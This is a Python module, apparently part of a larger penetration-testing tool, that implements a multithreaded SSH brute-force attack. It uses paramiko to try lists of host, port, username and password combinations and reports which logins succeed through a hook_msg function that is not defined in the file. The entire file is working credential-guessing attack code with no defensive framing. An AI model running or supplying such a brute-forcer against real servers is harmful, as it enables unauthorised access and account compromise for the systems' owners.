#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
@Author: reber
@Mail: reber0ask@qq.com
@Date: 2019-05-22 15:30:07
@LastEditTime: 2019-12-26 15:50:30
'''

import paramiko
from concurrent.futures import ThreadPoolExecutor

import pathlib
from config import log_file_path
paramiko.util.log_to_file(log_file_path.joinpath("paramiko.log"))

class SshBruteForce(object):
    """SshBruteForce"""
    def __init__(self, targets, thread_num, timeout):
        super(SshBruteForce, self).__init__()
        self.targets = targets
        self.thread_num = thread_num
        self.timeout = timeout

    def worker(self,hpup):
        host,port,user,pwd = hpup
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname=host, port=port, username=user, password=pwd, timeout=self.timeout)
        except Exception as e:
            hook_msg((False,host,port,user,pwd))
        else:
            hook_msg((True,host,port,user,pwd))
        finally:
            ssh.close()

    def run(self):
        with ThreadPoolExecutor(max_workers = self.thread_num) as executor:
            for host,port,user,pwd in self.targets:
                f = executor.submit(self.worker,(host,port,user,pwd))
                # f.add_done_callback(call_back)


bruter = SshBruteForce

